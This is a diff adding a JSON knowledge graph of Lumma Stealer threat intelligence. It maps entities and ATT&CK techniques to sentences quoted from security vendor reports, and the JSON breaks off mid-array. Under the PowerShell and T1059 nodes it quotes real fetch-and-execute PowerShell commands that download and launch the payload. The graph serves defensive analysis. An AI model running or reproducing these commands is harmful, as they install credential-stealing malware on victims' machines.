@@ -1,0 +1,2806 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0da72dbfbed1",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Trellix Advanced Research Center",
+        "edges": [],
+        "source": {
+          "Trellix Advanced Research Center_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              0,
+              "The Trellix Advanced Research Center has been tracking recent campaigns by the threat actors behind Lumma Stealer and analyzing the evolution of their TTPs."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_22dbb4876dac",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Steam",
+        "edges": [
+          "EDGE_5df3de05b419",
+          "EDGE_d262370f9247"
+        ],
+        "source": {
+          "Steam_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              35,
+              "From the response, Lumma extracts the Steam username and uses it to derive the C2 URL."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_28bb92983c8f",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Lumma Stealer",
+        "edges": [
+          "EDGE_0120ad86b4b3",
+          "EDGE_1e4e1261c92e",
+          "EDGE_3a443f33e286",
+          "EDGE_4b0424d6205b",
+          "EDGE_5b2ab5cdbe98",
+          "EDGE_80dd8e4acfcd",
+          "EDGE_a06448532393",
+          "EDGE_a5c2af776aa9",
+          "EDGE_c92068dab7c3",
+          "EDGE_c94e842c7528",
+          "EDGE_d1d87e48a7c5",
+          "EDGE_d984a70dcc34",
+          "EDGE_e8bb82a1c34c",
+          "EDGE_f08b2c16e203",
+          "EDGE_f26373c2e581",
+          "EDGE_1f3ab148d259",
+          "EDGE_472715b1d6cf",
+          "EDGE_9de999bb382b",
+          "EDGE_da50ffe5fd8a",
+          "EDGE_de91a95465c8",
+          "EDGE_21f114a92109",
+          "EDGE_5144e53ca8f3"
+        ],
+        "source": {
+          "Lumma Stealer_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              0,
+              "The Trellix Advanced Research Center has been tracking recent campaigns by the threat actors behind Lumma Stealer and analyzing the evolution of their TTPs."
+            ],
+            [
+              51,
+              "In conclusion, Lumma Stealer continues to pose a significant threat to data security."
+            ]
+          ],
+          "Lumma Stealer_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              0,
+              "Lumma Stealer, a potent information-stealing malware, emerged in 2022, targeting sensitive data like browser-stored passwords, cryptocurrency wallets, and 2FA tokens."
+            ],
+            [
+              2,
+              "Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware."
+            ],
+            [
+              7,
+              "It also reflects the increasing adaptability of threat actors behind malware like Lumma Stealer, who continuously refine their delivery methods to outpace security solutions."
+            ],
+            [
+              20,
+              "Inside the archive file, users find a large executable file (.exe) having file size (>800mb, which acts as the Lumma Stealer’s payload."
+            ],
+            [
+              39,
+              "Lumma Stealer uses TLS for C2 communication because this protocol offers encrypted communication, which makes it difficult to detect malware activity over the communication."
+            ],
+            [
+              43,
+              "The Lumma Stealer campaign highlights a layered and evolving malware delivery strategy that blends social engineering with abuse of legitimate infrastructure to bypass defences."
+            ]
+          ],
+          "Lumma C2 Stealer_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              1,
+              "Lumma C2 Stealer is a variant of information stealer malware, first sighted in December 2022."
+            ]
+          ],
+          "LUMMA_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              0,
+              "This post will delve into a recent incident response engagement handled by NCC Group’s Digital Forensics and Incident Response (DFIR) team in May 2025 involving the infostealer LUMMA."
+            ],
+            [
+              4,
+              "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome."
+            ],
+            [
+              5,
+              "Since its birth, LUMMA has utilised various tactics and techniques."
+            ],
+            [
+              6,
+              "In this incident, one host was impacted after the user was directed to a fake CAPTCHA verification page – one of the newer techniques observed in LUMMA campaigns."
+            ]
+          ]
+        },
+        "alias": [
+          "Lumma C2 Stealer",
+          "LUMMA"
+        ]
+      },
+      {
+        "node_id": "HL_44463ac59fa0",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows",
+        "edges": [],
+        "source": {
+          "Windows_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              10,
+              "The decrypted string is passed as an argument to a function that leverages Process Environment Block (PEB) data structure in Windows to resolve the library's address in memory."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_84858ea90f98",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": ".NET",
+        "edges": [
+          "EDGE_8e8322fd49b0"
+        ],
+        "source": {
+          ".NET_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              4,
+              "The .NET binary, obfuscated with Crypto Obfuscator, injects the Lumma binary into the RegSvcs.exe process."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9b5521d9eb21",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Crypto Obfuscator",
+        "edges": [
+          "EDGE_ee7c1d183bc6"
+        ],
+        "source": {
+          "Crypto Obfuscator_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              4,
+              "The .NET binary, obfuscated with Crypto Obfuscator, injects the Lumma binary into the RegSvcs.exe process."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a81bc98d80e7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_fedc2391e361",
+          "EDGE_0614f566784c",
+          "EDGE_d0561c2b16e8"
+        ],
+        "source": {
+          "PowerShell_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              2,
+              "A threat actor was observed distributing Lumma via obfuscated PowerShell scripts."
+            ]
+          ],
+          "PowerShell_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              21,
+              "The Microsoft.Windows .Shell.RunDialog was opened and used to execute the PowerShell command: powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))."
+            ],
+            [
+              22,
+              "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed."
+            ],
+            [
+              27,
+              "T1027 – Obfuscated Files or Information The PowerShell command to retrieve afc.zip was heavily obfuscated."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ae7ae0795bc4",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Telegram",
+        "edges": [
+          "EDGE_0be4ddc72655"
+        ],
+        "source": {
+          "Telegram_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              47,
+              "In addition to application names, the Lumma configuration includes paths to browsers, wallets, FTP applications, VPN software, Telegram, cloud-service provider applications, Anydesk, and password managers."
+            ]
+          ],
+          "Telegram_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              42,
+              "It also targets user-sensitive files, Telegram data, email clients, cryptocurrency wallets, FTP, and Remote client data and more."
+            ],
+            [
+              46,
+              "This malware, after being executed in the victim’s system, is capable of stealing user-sensitive data such as browser credentials, ftp and remote client data, Telegram data and other sensitive information."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_f8b77c8fe4ea",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Anydesk",
+        "edges": [
+          "EDGE_66bd904707c8"
+        ],
+        "source": {
+          "Anydesk_A Deep Dive into the Latest Version of Lumma InfoStealer": [
+            [
+              47,
+              "In addition to application names, the Lumma configuration includes paths to browsers, wallets, FTP applications, VPN software, Telegram, cloud-service provider applications, Anydesk, and password managers."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_1cac50f138e8",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Forcepoint",
+        "edges": [],
+        "source": {
+          "Forcepoint_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              2,
+              "Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_25da5e1178db",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Alexander.com",
+        "edges": [
+          "EDGE_096541b6807b",
+          "EDGE_0cd67f5ac947",
+          "EDGE_2edc22aeb0f3",
+          "EDGE_5ae49dc37cfa",
+          "EDGE_f55df411f5fa"
+        ],
+        "source": {
+          "Alexander.com_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              30,
+              "These .accde files combine and make an Auto IT-compiled executable, Alexander.com, which is an Auto IT file loader."
+            ],
+            [
+              32,
+              "During analysis of the final payload Alexander.com, which is an AutoIT loader, we observed the payload runs a script o.a3x, which is an AutoIT compiled script."
+            ],
+            [
+              35,
+              "The script is capable of injecting into its own process (Alexander.com), which can be obtained by repeated use of DllCall(“kernel32.dll”, “ptr”, “GetCurrentProcess”)\\Second stage payload execution using the Execute function."
+            ],
+            [
+              38,
+              "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5a2fd38838d5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Caucasus region of Eastern Europe and West Asia",
+        "edges": [],
+        "source": {
+          "Caucasus region of Eastern Europe and West Asia_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              23,
+              "Additionally, the final URL hosting the archive file is geofenced, accessible only in specific regions such as Georgia, Russia, and the Caucasus region of Eastern Europe and West Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6c8a333930de",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Auto IT",
+        "edges": [
+          "EDGE_08f93221df66"
+        ],
+        "source": {
+          "Auto IT_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              30,
+              "These .accde files combine and make an Auto IT-compiled executable, Alexander.com, which is an Auto IT file loader."
+            ]
+          ],
+          "AutoIT_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              32,
+              "During analysis of the final payload Alexander.com, which is an AutoIT loader, we observed the payload runs a script o.a3x, which is an AutoIT compiled script."
+            ]
+          ]
+        },
+        "alias": [
+          "AutoIT"
+        ]
+      },
+      {
+        "node_id": "HL_7455d6e9fdc5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Russia",
+        "edges": [],
+        "source": {
+          "Russia_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              23,
+              "Additionally, the final URL hosting the archive file is geofenced, accessible only in specific regions such as Georgia, Russia, and the Caucasus region of Eastern Europe and West Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8f21e9ef0956",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Georgia",
+        "edges": [],
+        "source": {
+          "Georgia_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              23,
+              "Additionally, the final URL hosting the archive file is geofenced, accessible only in specific regions such as Georgia, Russia, and the Caucasus region of Eastern Europe and West Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_03e5aa791b9b",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Edge",
+        "edges": [
+          "EDGE_84100496aab4"
+        ],
+        "source": {
+          "Microsoft Edge_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              4,
+              "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome."
+            ],
+            [
+              31,
+              "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_45787f8e84a8",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "France",
+        "edges": [],
+        "source": {
+          "France_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              17,
+              "fr-par refers to the region in this case France, Paris."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5d5502cadf89",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Scaleway",
+        "edges": [],
+        "source": {
+          "Scaleway_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              15,
+              "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS."
+            ],
+            [
+              18,
+              "scw.cloud is the domain for Scaleway."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6adc15335b24",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Chrome",
+        "edges": [
+          "EDGE_1ac302a91aa5"
+        ],
+        "source": {
+          "Google Chrome_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              4,
+              "In this case, LUMMA was seen targeting browser data, specifically the data stores Login Data and Web Data for Microsoft Edge and Google Chrome."
+            ],
+            [
+              31,
+              "T1555.003 – Credentials from Password Stores: Credentials from Web Browsers The AutoIt executable deci.com accessed the data stores Login Data and Web Data for both Microsoft Edge and Google Chrome browsers."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_70774b9d2409",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "AutoIt v3 Script (Beta)",
+        "edges": [
+          "EDGE_62d60562017e",
+          "EDGE_d47a0ca9e0e6"
+        ],
+        "source": {
+          "AutoIt v3 Script (Beta)_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              26,
+              "This application was found to be AutoIt v3 Script (Beta) which is a scripting language used for creating automation scripts."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9fac26b94980",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "AWS",
+        "edges": [],
+        "source": {
+          "AWS_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              15,
+              "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_cf87673c4819",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Paris",
+        "edges": [],
+        "source": {
+          "Paris_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              17,
+              "fr-par refers to the region in this case France, Paris."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e6482ab3fb5e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "NCC Group",
+        "edges": [],
+        "source": {
+          "NCC Group_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              0,
+              "This post will delve into a recent incident response engagement handled by NCC Group’s Digital Forensics and Incident Response (DFIR) team in May 2025 involving the infostealer LUMMA."
+            ]
+          ]
+        }
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1001",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1001",
+        "ttp_id": "T1001",
+        "best_span_sentences_list": [
+          [
+            "For instance, an encrypted C2 domain is decrypted as “mercharena[.]biz”."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            32,
+            32
+          ]
+        ],
+        "edges": [
+          "EDGE_d1d87e48a7c5"
+        ],
+        "source": {
+          "TTP:T1001_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                32,
+                32
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "For instance, an encrypted C2 domain is decrypted as “mercharena[.]biz”."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1005",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1005",
+        "ttp_id": "T1005",
+        "best_span_sentences_list": [
+          [
+            "Lumma's configuration includes around 89 application names related to wallets, crypto applications, password managers, authentication apps, payment apps, and more, which are targeted for exfiltration."
+          ],
+          [
+            "The image below illustrates the file paths that Lumma searches.",
+            "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            46,
+            46
+          ],
+          [
+            49,
+            50
+          ]
+        ],
+        "edges": [
+          "EDGE_0be4ddc72655",
+          "EDGE_66bd904707c8",
+          "EDGE_c94e842c7528"
+        ],
+        "source": {
+          "TTP:T1005_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                46,
+                46
+              ],
+              [
+                49,
+                50
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Lumma's configuration includes around 89 application names related to wallets, crypto applications, password managers, authentication apps, payment apps, and more, which are targeted for exfiltration."
+              ],
+              [
+                "The image below illustrates the file paths that Lumma searches.",
+                "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+              ]
+            ]
+          },
+          "TTP:T1005_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                42,
+                42
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It also targets user-sensitive files, Telegram data, email clients, cryptocurrency wallets, FTP, and Remote client data and more."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "A threat actor was observed distributing Lumma via obfuscated PowerShell scripts."
+          ],
+          [
+            "The .NET binary, obfuscated with Crypto Obfuscator, injects the Lumma binary into the RegSvcs.exe process."
+          ],
+          [
+            "Performing code analysis on the Lumma’s binary, its main function begins by passing encrypted strings to a decryption routine."
+          ],
+          [
+            "Lumma employs advanced codeflow obfuscation techniques to significantly complicate the analysis."
+          ],
+          [
+            "Lumma uses an API hashing technique to dynamically resolve API functions during runtime, a common method employed by malware to locate APIs as needed."
+          ],
+          [
+            "All strings related to C2 communications including domains, backup domains, header, and HTTP methods are stored in encrypted format.",
+            "For instance, an encrypted C2 domain is decrypted as “mercharena[.]biz”."
+          ],
+          [
+            "C2 returned an encrypted configuration file.",
+            "After decryption, the contents revealed a malware configuration file in JSON format, which detailed the specific data Lumma intends to exfiltrate, including browser data, wallet information, password manager details, and critical file paths."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            4,
+            4
+          ],
+          [
+            7,
+            7
+          ],
+          [
+            12,
+            12
+          ],
+          [
+            15,
+            15
+          ],
+          [
+            31,
+            32
+          ],
+          [
+            40,
+            41
+          ]
+        ],
+        "edges": [
+          "EDGE_5b2ab5cdbe98",
+          "EDGE_e5ac937da96f",
+          "EDGE_ee7c1d183bc6",
+          "EDGE_0614f566784c"
+        ],
+        "source": {
+          "TTP:T1027_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                4,
+                4
+              ],
+              [
+                7,
+                7
+              ],
+              [
+                12,
+                12
+              ],
+              [
+                15,
+                15
+              ],
+              [
+                31,
+                32
+              ],
+              [
+                40,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A threat actor was observed distributing Lumma via obfuscated PowerShell scripts."
+              ],
+              [
+                "The .NET binary, obfuscated with Crypto Obfuscator, injects the Lumma binary into the RegSvcs.exe process."
+              ],
+              [
+                "Performing code analysis on the Lumma’s binary, its main function begins by passing encrypted strings to a decryption routine."
+              ],
+              [
+                "Lumma employs advanced codeflow obfuscation techniques to significantly complicate the analysis."
+              ],
+              [
+                "Lumma uses an API hashing technique to dynamically resolve API functions during runtime, a common method employed by malware to locate APIs as needed."
+              ],
+              [
+                "All strings related to C2 communications including domains, backup domains, header, and HTTP methods are stored in encrypted format.",
+                "For instance, an encrypted C2 domain is decrypted as “mercharena[.]biz”."
+              ],
+              [
+                "C2 returned an encrypted configuration file.",
+                "After decryption, the contents revealed a malware configuration file in JSON format, which detailed the specific data Lumma intends to exfiltrate, including browser data, wallet information, password manager details, and critical file paths."
+              ]
+            ]
+          },
+          "TTP:T1027_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                5,
+                5
+              ],
+              [
+                18,
+                18
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "One standout feature of the campaign is the inclusion of a dynamic element: a unique password that is generated for every downloaded archive file."
+              ],
+              [
+                "At this point, the final URL provides users with a downloadable archive file, paired with a password required to unlock its contents."
+              ]
+            ]
+          },
+          "TTP:T1027_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                22,
+                22
+              ],
+              [
+                27,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed."
+              ],
+              [
+                "T1027 – Obfuscated Files or Information The PowerShell command to retrieve afc.zip was heavily obfuscated."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "The injected Lumma payload then continues to operate, masquerading as the legitimate RegSvcs.exe utility."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            5
+          ]
+        ],
+        "edges": [
+          "EDGE_d984a70dcc34"
+        ],
+        "source": {
+          "TTP:T1036_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                5,
+                5
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The injected Lumma payload then continues to operate, masquerading as the legitimate RegSvcs.exe utility."
+              ]
+            ]
+          },
+          "TTP:T1036_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                8,
+                10
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The Lumma Stealer campaign initiates with a strategically crafted URL that leads the user to a PDF file.",
+                "At face value, both the URL and the document appear benign, effectively reducing suspicion and bypassing initial detection.",
+                "The attackers leverage the credibility of widely recognized hosting services to host these malicious PDFs, including platforms like wsimg.com and cdn-website.com."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1041",
+        "ttp_id": "T1041",
+        "best_span_sentences_list": [
+          [
+            "The image below illustrates the file paths that Lumma searches.",
+            "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            49,
+            50
+          ]
+        ],
+        "edges": [
+          "EDGE_3a443f33e286",
+          "EDGE_26a8fc6e21a2",
+          "EDGE_98f87b0cbec0",
+          "EDGE_e78d86c08edf",
+          "EDGE_f55df411f5fa"
+        ],
+        "source": {
+          "TTP:T1041_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                49,
+                50
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The image below illustrates the file paths that Lumma searches.",
+                "If a specified path is found, the file is read and stored in the designated directory path before being exfiltrated to C2."
+              ]
+            ]
+          },
+          "TTP:T1041_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                38,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration.",
+                "Lumma Stealer uses TLS for C2 communication because this protocol offers encrypted communication, which makes it difficult to detect malware activity over the communication.",
+                "After receiving the response from the C2 server, the malware begins to exfiltrate data from the victim’s system.",
+                "The data is collected in the form of web browser history, extensions, login data, and cache."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1055",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1055",
+        "ttp_id": "T1055",
+        "best_span_sentences_list": [
+          [
+            "The .NET binary, obfuscated with Crypto Obfuscator, injects the Lumma binary into the RegSvcs.exe process."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ]
+        ],
+        "edges": [
+          "EDGE_0120ad86b4b3",
+          "EDGE_8e8322fd49b0",
+          "EDGE_5ae49dc37cfa"
+        ],
+        "source": {
+          "TTP:T1055_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                4,
+                4
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The .NET binary, obfuscated with Crypto Obfuscator, injects the Lumma binary into the RegSvcs.exe process."
+              ]
+            ]
+          },
+          "TTP:T1055_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                35,
+                35
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The script is capable of injecting into its own process (Alexander.com), which can be obtained by repeated use of DllCall(“kernel32.dll”, “ptr”, “GetCurrentProcess”)\\Second stage payload execution using the Execute function."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1059",
+        "ttp_id": "T1059",
+        "best_span_sentences_list": [
+          [
+            "A threat actor was observed distributing Lumma via obfuscated PowerShell scripts."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ]
+        ],
+        "edges": [
+          "EDGE_a06448532393",
+          "EDGE_fedc2391e361",
+          "EDGE_08f93221df66",
+          "EDGE_0cd67f5ac947",
+          "EDGE_62d60562017e",
+          "EDGE_7b94a7451707"
+        ],
+        "source": {
+          "TTP:T1059_A Deep Dive into the Latest Version of Lumma InfoStealer": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A threat actor was observed distributing Lumma via obfuscated PowerShell scripts."
+              ]
+            ]
+          },
+          "TTP:T1059_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": {
+            "best_span_ranges": [
+              [
+                21,
+                21
+              ],
+              [
+                27,
+                28
+              ],
+              [
+                30,
+                30
+              ],
+              [
+                32,
+                32
+              ],
+              [
+                37,
+                37
+              ],
+              [
+                45,
+                45
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Accompanying this stage are explicit instructions that urge users to copy and paste the URL from the final link to download the archive file, open it using the password, and then execute the .exe file through the command prompt."
+              ],
+              [
+                "6.1 - Mars.accde\nSome parts of Mars.accde are not found to be encrypted.",
+                "It contains compiled VBA logic, and some embedded form/module identifiers remain in the binary."
+              ],
+              [
+                "These .accde files combine and make an Auto IT-compiled executable, Alexander.com, which is an Auto IT file loader."
+              ],
+              [
+                "During analysis of the final payload Alexander.com, which is an AutoIT loader, we observed the payload runs a script o.a3x, which is an AutoIT compiled script."
+              ],
+              [
+                "From the script, ObjGet( function is used to connect to C2, which de-obfuscates to something like a moniker string or CLSID URL, pointing to a remote COM object or ActiveX control, which is a well-known fileless C2 method."
+              ],
+              [
+                "Upon execution, it performs a series of actions including creating .accde files in the \\\\Appdata\\\\Local\\\\Temp folder, which is then used to create an AutoIT compiled executable along with a malicious .a3x script."
+              ]
+            ]
+          },
+          "TTP:T1059_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": {
+            "best_span_ranges": [
+              [
+                21,
+                23
+              ],
+              [
+                27,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The Microsoft.Windows .Shell.RunDialog was opened and used to execute the PowerShell command: powershell -w hidden -nop -c $a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b)).",
+                "In addition to the PowerShell command executed in a hidden window, another PowerShell which was heavily obfuscated was executed.",
+                "The decoded command was:\niexhxxps://pub-24086c859ed94d628b911deba63401ab.r2[.]dev/\nafc.zip$zip=\"$env:TEMP\\afc.zip\";\n$dest=Join-Path $env:TEMP (\"afc_\" + [guid]::NewGuid()); Expand-\nArchive -Path $zip -DestinationPath $dest; Start-Process -FilePath\n(Join-Path $dest \"AF1.exe\");\n$curl_command = $env:Temp;function wFPvdCjBn($iFuLaZNIo, $AFAeOI)\n{curl $iFuLaZNIo -o $AFAeOI};function OlxYsax($GIHRSiO){wFPvdCjBn\n$GIHRSiO $AFAeOI}$AFAeOI = $env:Temp + '\\afc.zip';OlxYsax\n$CPSr.SubString(3,59);\nExpand-Archive -Path $AFAeOI -DestinationPath $curl_command;Add-Type\n-Assembly System.IO.Compression.FileSystem;$JYcciN =\n[IO.Compression.ZipFile]::OpenRead($AFAeOI);$RNofm =($JYcciN.Entries\n| Sort-Object Name | Select-Object -First 1).Name;$mBSw = Join-Path\n$env:Temp $RNofm;start $mBSw ;;."
+              ],
+              [
+                "T1027 – Obfuscated Files or Information The PowerShell command to retrieve afc.zip was heavily obfuscated."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Dynamic analysis revealed that Lumma is calling multiple domains before calling the legitimate “steamcommunity.com”."
+          ],
+          [
+            "Then, Lumma sends another POST request with body containing action(act) property as “recive_message” (with the misspelling of the word receive), version as “4.0” and license ID as “f9tVYj--testik1”."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            30,
+            30
+          ],
+          [
